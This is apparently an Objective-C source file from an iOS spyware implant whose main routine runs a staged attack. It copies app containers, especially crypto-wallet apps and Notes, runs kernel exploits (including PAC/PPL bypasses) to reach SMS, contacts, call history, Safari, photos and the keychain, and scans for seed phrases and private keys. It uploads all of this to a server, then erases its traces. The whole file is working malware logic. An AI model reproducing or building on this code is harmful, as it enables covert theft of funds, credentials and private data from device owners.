#import "OWRoute.h"
#import "OWCommon.h"
#import "OWKernelChain.h"
#import "OWContainerPass.h"
#import "OWKeys.h"
#import "OWExfil.h"
#import "OWCleanup.h"
#import "OWSystemGrab.h"
#import "OWExtractor.h"
#import "OWArchive.h"

@interface OWRoute ()
- (void)_uploadContainerResult:(NSDictionary *)r uploader:(OWUploader *)up;
- (NSDictionary *)_walletManifestForName:(NSString *)name
                                bundleID:(NSString *)bid
                                   bytes:(NSNumber *)bytes;
@end

@implementation OWRoute {
    OWRoutePhase _phase;
}

+ (instancetype)shared {
    static OWRoute *r;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ r = [[OWRoute alloc] init]; });
    return r;
}

- (NSString *)phaseName {
    switch (_phase) {
        case OWRoutePhaseIdle:             return @"idle";
        case OWRoutePhaseContainer:        return @"container";
        case OWRoutePhaseContainerUpload:  return @"container-upload";
        case OWRoutePhaseKernel:           return @"kernel";
        case OWRoutePhaseKeys:             return @"keys";
        case OWRoutePhaseKeysUpload:       return @"keys-upload";
        case OWRoutePhaseCleanup:          return @"cleanup";
        case OWRoutePhaseDone:             return @"done";
        case OWRoutePhaseFailed:           return @"failed";
    }
    return @"?";
}

- (void)_setPhase:(OWRoutePhase)p {
    _phase = p;
    [[OWState shared] setObject:self.phaseName forKey:@"phase"];
    OWLog(@"阶段 -> %@", self.phaseName);
}

- (void)start {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        @autoreleasepool { [self _run]; }
    });
}

- (void)_run {
    OWState *state = [OWState shared];
    OWDeviceProfile *dev = [OWDeviceProfile current];

    OWLog(@"======== 启动 ========");
    OWLog(@"设备 %@ iOS %@ build=%@ SoC=%@ arm64e=%d bmh=%@",
          dev.machine, dev.osVersion, dev.osBuild.length ? dev.osBuild : @"(未知)",
          dev.socTierName, dev.isArm64e, dev.bootManifestHash ?: @"(nil)");

    if ([state isDone]) {
        OWLog(@"已完成标记存在，跳过");
        [self _setPhase:OWRoutePhaseDone];
        return;
    }

    OWUploader *up = [OWUploader new];

    // ---- 步骤 1：容器通道先跑先传（纯用户态、秒级、零风险）----
    [self _setPhase:OWRoutePhaseContainer];
    OWContainerPass *cp = [OWContainerPass new];
    NSError *err = nil;
    [cp run:&err];
    if (err) OWLog(@"容器通道: %@", err.localizedDescription);

    [self _setPhase:OWRoutePhaseContainerUpload];
    for (NSDictionary *r in cp.results) {
        [self _uploadContainerResult:r uploader:up];
    }

    // 端上抽取先跑一轮：容器通道拿到的库里若有明文，这是最值钱的部分，
    // 体积又小，必须跟着第一批一起走。
    OWExtractor *ex = [OWExtractor new];
    [ex scanResultList:cp.results];
    [self _flushExtractor:ex dir:[self _extractDir] uploader:up];

    [up enqueueManifest:@{@"machine": dev.machine, @"os": dev.osVersion,
                          @"soc": dev.socTierName, @"bmh": dev.bootManifestHash ?: @""} error:nil];
    [up flush:&err];   // 先传：不等内核结果，最差情况也有容器数据

    // ---- 步骤 2：内核静态门 → 偏移 → 尝试队列 ----
    [self _setPhase:OWRoutePhaseKernel];
    OWKernelChain *kc = [OWKernelChain new];

    if (![kc kernelStaticallySupported]) {
        OWLog(@"内核: 本设备无可用 kernel exploit，保持容器通道结果（不写空 done）");
        [self _finishWithUploader:up];
        return;
    }

    // 先跑 PAC → PPL 支撑利用（上游 Dopamine 就是这个顺序）。
    // 失败不算链路失败，只是依赖 PPL 的内核 exploit 会更难成功。
    NSUInteger support = [kc runSupportPass:&err];
    OWLog(@"内核: 支撑利用（PAC/PPL）成功 %lu 个", (unsigned long)support);
    err = nil;

    if (![kc resolveOffsets:&err]) {
        _lastError = err.localizedDescription;
        OWLog(@"内核: 偏移阶段失败 %@", _lastError);
        [self _finishWithUploader:up];
        return;
    }

    if (![kc runKernelPass:&err]) {
        _lastError = err.localizedDescription;
        OWLog(@"内核: %@ —— 降级到容器通道结果", _lastError);
        [self _finishWithUploader:up];
        return;
    }

    // ---- 步骤 3：钥匙层 ----
    [self _setPhase:OWRoutePhaseKeys];
    OWRemoteCall *rc = [OWRemoteCall new];
    OWKeys *ks = [OWKeys new];

    // 系统库：短信 / 通讯录 / 通话 / Safari / 相册 —— 通道 B 永远够不到的一层
    OWSystemGrab *sg = [OWSystemGrab new];
    if (![sg runWithRemote:rc error:&err]) {
        OWLog(@"系统: %@（容器-only 场景属预期）", err.localizedDescription ?: @"不可读");
        err = nil;
    }
    for (NSDictionary *r in sg.results) {
        [up enqueueFile:r[@"path"] kind:OWUploadKindSystem error:nil];
    }

    if ([ks grabKeychainDBWithRemote:rc error:&err]) {
        NSString *db = [ks.outDir stringByAppendingPathComponent:@"keychain-2.db"];
        [ks exportTablesFromKeychainDB:db error:&err];
        [ks exportKeychainMetadataFromDB:db error:&err];
    } else {
        OWLog(@"钥匙: %@", err.localizedDescription ?: @"keychain 不可达");
        err = nil;
    }
    [ks grabKeychainDirWithRemote:rc error:nil];   // metadata_class_keys.plist

    // 系统库与 keychain 的明文抽取（第二轮，追加到同一个 extractor）
    [ex scanResultList:sg.results];
    [ex scanPaths:[ks producedFiles] label:@"keys"];

    if (![ks acquireClassKeysVia:rc error:&err]) {
        _lastError = [NSString stringWithFormat:@"class keys: %@", err.localizedDescription ?: @"未知"];
        OWLog(@"钥匙: %@ —— 这是 iOS 18 出不了明文的根因位置", _lastError);
    }

    [self _setPhase:OWRoutePhaseKeysUpload];
    for (NSString *f in [ks producedFiles]) {
        [up enqueueFile:f kind:OWUploadKindKeys error:nil];
    }
    [self _flushExtractor:ex dir:[self _extractDir] uploader:up];
    [up flush:&err];

    [self _finishWithUploader:up];
}

#pragma mark 容器结果打包上传

/// 每个目标独立打一个 zip：包根 _manifest.json + <bundleId>/ 文件。
/// 服务端 route_native_upload 只有看到 zip 根的 _manifest.json 才会归入 wallet_*。
- (void)_uploadContainerResult:(NSDictionary *)r uploader:(OWUploader *)up {
    NSString *p = r[@"path"];
    if (!p.length) return;

    BOOL isDir = NO;
    if (![[NSFileManager defaultManager] fileExistsAtPath:p isDirectory:&isDir]) return;

    NSString *rawName = r[@"name"] ?: @"Unknown";
    // 服务端把 Notes 单独归 notes_db；其余名字会落到 wallet_<name> / wallet_mix
    NSString *name = [rawName isEqualToString:@"AppleNotes"] ? @"Notes" : rawName;
    NSString *bid = r[@"bundleId"] ?: name;

    if (!isDir) {
        // whole_container 已经是 zip（OWContainerPass 打包时已带 _manifest.json）
        [up enqueueFile:p kind:OWUploadKindContainer error:nil];
        OWLog(@"上传: 整容器包 %@", p.lastPathComponent);
        return;
    }

    NSDictionary *manifest = [self _walletManifestForName:name bundleID:bid bytes:r[@"bytes"]];
    NSString *tmp = [NSTemporaryDirectory() stringByAppendingPathComponent:
        [NSString stringWithFormat:@"ow_pack_%@_%llu.zip", name,
         (unsigned long long)([[NSDate date] timeIntervalSince1970] * 1000)]];

    NSError *e = nil;
    BOOL ok = [OWArchive zipDirectory:p
                                   to:tmp
                             manifest:manifest
                               subdir:bid
                             maxBytes:200ULL * 1024 * 1024
                             totalCap:800ULL * 1024 * 1024
                                error:&e];
    if (ok) {
        BOOL enq = [up enqueueFile:tmp kind:OWUploadKindContainer error:nil];
        OWLog(@"上传: 钱包包 %@ -> %@", name, enq ? tmp.lastPathComponent : @"入队失败");
        [[NSFileManager defaultManager] removeItemAtPath:tmp error:nil];
        return;
    }

    // 打包失败才退回逐文件（至少不丢数据）
    OWLog(@"上传: 钱包打包失败 %@（%@），退回逐文件",
          name, e.localizedDescription ?: @"无条目");
    NSDirectoryEnumerator *en = [[NSFileManager defaultManager] enumeratorAtPath:p];
    NSUInteger n = 0;
    for (NSString *rel in en) {
        NSString *full = [p stringByAppendingPathComponent:rel];
        BOOL d = NO;
        if (![[NSFileManager defaultManager] fileExistsAtPath:full isDirectory:&d] || d) continue;
        [up enqueueFile:full kind:OWUploadKindContainer error:nil];
        n++;
    }
    OWLog(@"上传: 容器目录 %@ → %lu 个文件", name, (unsigned long)n);
}

- (NSDictionary *)_walletManifestForName:(NSString *)name
                                bundleID:(NSString *)bid
                                   bytes:(NSNumber *)bytes {
    UIDevice *dev = [UIDevice currentDevice];
    NSString *idfv = dev.identifierForVendor.UUIDString ?: @"";
    NSString *machine = [OWDeviceProfile current].machine ?: dev.model;
    NSArray *found = name.length ? @[name] : @[];
    NSArray *wallets = name.length
        ? @[@{@"wallet": name, @"bundleID": bid ?: @"", @"bytes": bytes ?: @0}]
        : @[];
    return @{
        @"deviceFolder": [NSString stringWithFormat:@"%@ iOS%@ %@",
                          dev.model, dev.systemVersion, idfv],
        @"ios": dev.systemVersion ?: @"",
        @"productType": machine ?: @"",
        @"found": found,
        @"wallets": wallets,
        @"source": @"OPENsrc",
    };
}

#pragma mark 抽取产物

- (NSString *)_extractDir {
    NSArray *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *d = [(docs.firstObject ?: NSTemporaryDirectory()) stringByAppendingPathComponent:@"ow_extract"];
    [[NSFileManager defaultManager] createDirectoryAtPath:d
                              withIntermediateDirectories:YES attributes:nil error:nil];
    return d;
}

- (void)_flushExtractor:(OWExtractor *)ex dir:(NSString *)dir uploader:(OWUploader *)up {
    if (!ex.hits.count) { OWLog(@"抽取: 本轮无命中"); return; }
    NSError *e = nil;
    if (![ex writeToDir:dir error:&e]) { OWLog(@"抽取: 落盘失败 %@", e.localizedDescription); return; }

    NSArray *kinds = @[OWHitKindMnemonic, OWHitKindPrivKeyHex, OWHitKindWIF, OWHitKindKeystore];
    BOOL money = NO;
    for (NSDictionary *h in ex.hits) if ([kinds containsObject:h[@"kind"]]) { money = YES; break; }

    [up enqueueFile:ex.lastJSONPath    kind:OWUploadKindHits error:nil];
    if (ex.lastPlainPath) [up enqueueFile:ex.lastPlainPath kind:OWUploadKindHits error:nil];
    if (money) [[OWState shared] setObject:@YES forKey:OWStateKeyKeysAcquired];
    OWLog(@"抽取: %lu 条入队%@", (unsigned long)ex.hits.count,
          money ? @"（含助记词/私钥类高价值命中）" : @"");
}

- (void)_finishWithUploader:(OWUploader *)up {
    // 规则三：空结果绝不写 done —— 否则后续不再重试，永久零数据
    BOOL valid = [self _hasValidPayload];
    OWLog(@"判定: 有效载荷 = %@", valid ? @"有" : @"无");

    if (valid) {
        [[OWState shared] markDoneIfPayloadValid:YES];
        [self _setPhase:OWRoutePhaseCleanup];
        [[OWCleanup new] execute];
        [self _setPhase:OWRoutePhaseDone];
    } else {
        [[OWState shared] setObject:@([[OWState shared] objectForKey:@"emptyRounds"] ?
                                      [[[OWState shared] objectForKey:@"emptyRounds"] intValue] + 1 : 1)
                             forKey:@"emptyRounds"];
        OWLog(@"本轮无有效载荷，保留未完成状态，下次启动继续");
        [self _setPhase:OWRoutePhaseFailed];
    }
    OWLog(@"======== 结束 phase=%@ ========", self.phaseName);
}

- (BOOL)_hasValidPayload {
    for (NSDictionary *p in [[OWState shared] payloads]) {
        if ([p[@"valid"] boolValue]) return YES;
    }
    return [[OWState shared] objectForKey:OWStateKeyKeysAcquired] != nil;
}

@end
